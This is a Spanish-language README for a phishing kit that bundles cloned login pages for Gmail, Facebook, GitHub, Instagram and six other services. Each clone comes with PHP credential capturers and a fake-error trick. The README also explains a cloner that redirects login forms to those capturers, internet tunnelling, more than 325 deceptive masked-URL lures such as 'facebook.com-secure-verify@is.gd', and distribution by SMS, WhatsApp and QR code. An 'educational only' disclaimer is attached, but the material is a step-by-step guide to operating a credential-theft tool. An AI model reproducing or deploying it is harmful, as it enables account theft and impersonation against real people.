
# 🎯 Advanced Phishing Simulation Framework v5.0
#autor:N2O

> **⚠️ EDUCATIONAL PURPOSE ONLY**
> 
> This framework is designed exclusively for **authorized security testing** and **educational demonstrations** of phishing techniques. Usage for illegal activities is strictly prohibited.

---

## 📖 Tabla de Contenidos

- [📋 Plataformas Incluidas](#-plataformas-incluidas)
- [🚀 Instalación Rápida](#-instalación-rápida)
- [📦 Requisitos del Sistema](#-requisitos-del-sistema)
- [🔧 Instalación Detallada](#-instalación-detallada)
- [🤖 El Clonador Universal](#-el-clonador-universal)
- [📊 Estructura del Proyecto](#-estructura-del-proyecto)
- [🎭 Técnicas de Enmascaramiento](#-técnicas-de-enmascaramiento)
- [📱 Uso del Framework](#-uso-del-framework)
- [🔍 Solución de Problemas](#-solución-de-problemas)
- [⚠️ Limitaciones del Clonador](#️-limitaciones-del-clonador)
- [📄 Licencia y Disclaimer](#-licencia-y-disclaimer)

---

## 📋 Plataformas Incluidas

El framework incluye **10 plataformas pre-configuradas y listas para usar**:

| Plataforma | Carpeta | Estado | Características |
|------------|---------|--------|-----------------|
| **Discord** | `sites/discord` | ✅ Premium | Logo SVG, dark mode, doble validación |
| **Facebook** | `sites/facebook` | ✅ Premium | Logo oficial, recovery pages |
| **GitHub** | `sites/github` | ✅ Premium | Dark mode, passkey, Google/Apple login |
| **Gmail** | `sites/gmail` | ✅ Premium | 2-step login, logo Google |
| **Instagram** | `sites/instagram` | ✅ Premium | Logo degradado, Facebook login |
| **LinkedIn** | `sites/linkedin` | ✅ Premium | Google/Apple login, mostrar contraseña |
| **Messenger** | `sites/messenger` | ✅ Premium | Logo oficial, diseño limpio |
| **Netflix** | `sites/netflix` | ✅ Premium | Fondo oscuro, logo rojo |
| **TikTok** | `sites/tiktok` | ✅ Premium | Logo cyan/rosa, QR code |
| **Yahoo** | `sites/yahoo` | ✅ Premium | Logo oficial, diseño clásico |

**Todas las plataformas incluyen:**
- ✅ Página de login (`index.html`)
- ✅ Capturador de credenciales (`verify.php`)
- ✅ Página de recuperación (`recovery.html`)
- ✅ Capturador de recovery (`capture_recovery.php`)
- ✅ Doble validación (error fingido)
- ✅ Diseño responsive (móvil y PC)
- ✅ Logos oficiales en SVG inline

---

## 🚀 Instalación Rápida

```bash
# 1. Clonar el repositorio
git clone https://github.com/yourusername/AdvancedPhishingFramework.git
cd AdvancedPhishingFramework

# 2. Ejecutar el instalador automático
chmod +x setup.sh
./setup.sh

# 3. Iniciar el framework
./advanced_phisher.sh
```

📦 Requisitos del Sistema
Sistema Operativo
✅ Kali Linux

✅ Ubuntu 20.04+

✅ Debian 11+

✅ Parrot OS

✅ Arch Linux

✅ Termux (Android)

```
Dependencias Base
Paquete	Versión Mínima	Instalación
PHP	7.4+	sudo apt install php php-cli php-sqlite3
Python3	3.8+	sudo apt install python3 python3-pip
SSH	OpenSSH 7.0+	sudo apt install openssh-client
cURL	7.0+	sudo apt install curl
qrencode	4.0+	sudo apt install qrencode
SQLite3	3.0+	sudo apt install sqlite3
xclip	0.13+	sudo apt install xclip
Dependencias Python (para el clonador)
bash
# Crear entorno virtual
python3 -m venv venv
source venv/bin/activate
```
```
# Instalar dependencias
pip install -r requirements.txt
Dependencias para Selenium (renderizado JavaScript)
Componente	Instalación
Google Chrome	wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && sudo dpkg -i google-chrome-stable_current_amd64.deb
ChromeDriver	Se instala automáticamente con webdriver-manager
```
🔧 Instalación Detallada
```
Paso 1: Instalar dependencias del sistema
Ubuntu/Debian/Kali:
bash
sudo apt update
sudo apt install -y php php-cli php-sqlite3 python3 python3-pip python3-venv openssh-client curl wget qrencode sqlite3 xclip
```
```
Arch/Manjaro:
bash
sudo pacman -S php python python-pip openssh curl wget qrencode sqlite3 xclip
```
```
Termux (Android):
bash
pkg install php python openssh curl wget qrencode sqlite
Paso 2: Instalar Google Chrome (para el clonador)
bash
```
```
# Método 1: Descarga directa
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome-stable_current_amd64.deb
sudo apt install -f -y

# Método 2: Desde repositorio
wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list'
sudo apt update
sudo apt install -y google-chrome-stable

# Verificar instalación
google-chrome --version
Paso 3: Configurar entorno Python
bash
cd AdvancedPhishingFramework

# Crear entorno virtual
python3 -m venv venv

# Activar entorno virtual
source venv/bin/activate

# Instalar dependencias Python
pip install --upgrade pip
pip install -r requirements.txt

# Verificar instalación
python -c "from selenium import webdriver; print('✅ Selenium OK')"
python -c "from bs4 import BeautifulSoup; print('✅ BeautifulSoup OK')"
Paso 4: Verificar instalación completa
bash
# Ejecutar script de diagnóstico
./advanced_phisher.sh --check
```
✅ Lo que el clonador PUEDE hacer
```
Capacidad	Descripción
Renderizar JavaScript	Usa Selenium para ejecutar React/Vue/Angular
Descargar imágenes	Guarda logos, fondos e iconos localmente
Descargar CSS	Obtiene hojas de estilo y las aplica
Detectar formularios	Identifica campos de usuario/contraseña automáticamente
Modificar action	Cambia el destino del formulario a verify.php
Añadir doble validación	Inyecta script de error fingido
Crear archivos PHP	Genera verify.php y capture_recovery.php automáticamente
```
❌ Lo que el clonador NO puede hacer
```
Limitación	Explicación	Solución
Sitios con Cloudflare	Bloquean Selenium	Usar plantilla manual
Detección de bots avanzada	Algunos sitios detectan Chrome headless	Usar plantilla manual
JavaScript ofuscado	Código protegido contra scraping	Usar plantilla manual
Autenticación previa	Páginas que requieren estar logueado	No soportado
Captchas	El clonador no puede resolver captchas	Usar plantilla manual
WebSockets/Streaming	Contenido en tiempo real	No soportado
```
Uso del Clonador
```bash
# Activar entorno virtual
source venv/bin/activate

# Clonar una página
python universal_cloner.py --url https://ejemplo.com/login --nombre plataforma --output sites/plataforma

# Ejemplo: Clonar Spotify
python universal_cloner.py --url https://accounts.spotify.com/login --name spotify --output sites/spotify
```
📊 Estructura del Proyecto
```text
AdvancedPhishingFramework/
├── advanced_phisher.sh          # Script principal del framework
├── setup.sh                     # Instalador automático
├── requirements.txt             # Dependencias Python
├── README.md                    # Este archivo
│
├── config/
│   ├── settings.conf            # Configuración del framework
│   └── templates.conf           # 325+ plantillas virales para masking
│
├── modules/
│   ├── cloner.py                # Clonador legacy
│   ├── dependency_checker.sh    # Verificador de dependencias
│   └── ...
│
├── venv/                        # Entorno virtual Python
│
├── sites/                       # Plataformas instaladas
│   ├── discord/                 # ✅ 10 plataformas pre-configuradas
│   ├── facebook/
│   ├── github/
│   ├── gmail/
│   ├── instagram/
│   ├── linkedin/
│   ├── messenger/
│   ├── netflix/
│   ├── tiktok/
│   └── yahoo/
│
├── captures/                    # Credenciales capturadas
│   ├── DIS/                     # Discord
│   ├── FB/                      # Facebook
│   ├── GIT/                     # GitHub
│   ├── GML/                     # Gmail
│   ├── INS/                     # Instagram
│   ├── LIN/                     # LinkedIn
│   ├── MSG/                     # Messenger
│   ├── NFX/                     # Netflix
│   ├── TK/                      # TikTok
│   └── YAH/                     # Yahoo
│
└── logs/                        # Logs del framework
    ├── php_server.log
    ├── tunnel.log
    ├── current_url.txt
    ├── masked_url.txt
    └── reports/
```
🎭 Técnicas de Enmascaramiento
```
El framework incluye 325+ plantillas virales para crear URLs enmascaradas:

Ejemplos de URLs enmascaradas
text
https://facebook.com-secure-verify-confirm@is.gd/AbC123
https://instagram.com-oferta-exclusiva-hoy@is.gd/XyZ789
https://tiktok.com-video-viral-eliminado@is.gd/DeF456
https://google.com-verificacion-urgente@is.gd/GhI012
```

Categorías de plantillas
Categoría	Ejemplos
```
💰 Dinero	mira-esta-forma-de-ganar-dinero-rapido
🎬 Viral	video-filtrado-de-famoso-en-la-playa
🔒 Seguridad	verificacion-de-cuenta-requerida
🎁 Promociones	has-ganado-un-premio-reclama-aqui
📰 Noticias	ultima-hora-terremoto-magnitud-8
📱 Uso del Framework
```

Menú Principal
```text
1) 🚀 Start New Campaign  - Iniciar campaña de phishing
2) 📊 View Captures       - Ver credenciales capturadas
3) 🧹 Clean Old Captures  - Limpiar capturas antiguas
4) 🤖 Clone Website       - Clonar nuevo sitio
5) 🚪 Exit               - Salir
Flujo de una Campaña
Seleccionar plataforma → Elige de las 10 disponibles

Elegir modo → Local o Tunnel (internet)

Configurar puerto → Default: 5555

Esperar URL del túnel → https://xxxx.lhr.life

Enmascarar URL → Opcional, 325+ plantillas

Distribuir → QR, WhatsApp, SMS, Email

Monitorear capturas → Tiempo real

Presionar ENTER para detener
```

Comandos Útiles
```bash
# Ver capturas
./advanced_phisher.sh --view

# Limpiar capturas antiguas (>7 días)
./advanced_phisher.sh --clean

# Verificar dependencias
./advanced_phisher.sh --check

# Iniciar en modo debug
./advanced_phisher.sh --debug
```
🔍 Solución de Problemas
```
❌ "Selenium no disponible"
bash
# Verificar que el entorno virtual está activo
source venv/bin/activate

# Reinstalar Selenium
pip install --upgrade selenium webdriver-manager

# Verificar Chrome
google-chrome --version
❌ "Failed to start PHP server"
bash
# Verificar que PHP está instalado
php --version

# Verificar puerto en uso
lsof -i:5555
kill -9 <PID>

# Cambiar puerto en la configuración
nano config/settings.conf
❌ "Tunnel shows login page"
El servidor PHP no está corriendo

El puerto no coincide

Solución: Reiniciar la campaña

❌ "Permission denied"
bash
chmod +x advanced_phisher.sh setup.sh clone.sh
chmod -R 755 sites/
chmod -R 755 captures/
❌ "externally-managed-environment" al instalar pip
bash
# Usar entorno virtual (RECOMENDADO)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# O forzar instalación (NO RECOMENDADO)
pip install --break-system-packages -r requirements.txt
⚠️ Limitaciones del Clonador
Sitios que requieren plantilla manual
Sitio	Razón
Discord	Carga dinámica compleja
LinkedIn	Detección de bots
GitHub	JavaScript ofuscado
Messenger	Redirige a Facebook
Yahoo	Protección anti-bot
Estos sitios YA ESTÁN incluidos como plantillas premium en el framework.
```

📄 Disclaimer
⚠️ DISCLAIMER LEGAL
Este software es EXCLUSIVAMENTE PARA FINES EDUCATIVOS y pruebas de seguridad autorizadas.

ESTÁ ESTRICTAMENTE PROHIBIDO:

❌ Usar este software para actividades ilegales

❌ Atacar sistemas sin autorización por escrito

❌ Robar credenciales de terceros

❌ Suplantar identidad

❌ Distribuir malware

El autor NO asume responsabilidad por:

Mal uso de esta herramienta

Daños derivados de su uso

Consecuencias legales de actividades no autorizadas

Al usar este software, usted acepta:

Usarlo solo para fines educativos y éticos

Obtener autorización antes de cualquier prueba

Cumplir con todas las leyes aplicables

🌟 Créditos
Advanced Phishing Simulation Framework v5.0

autor N2O
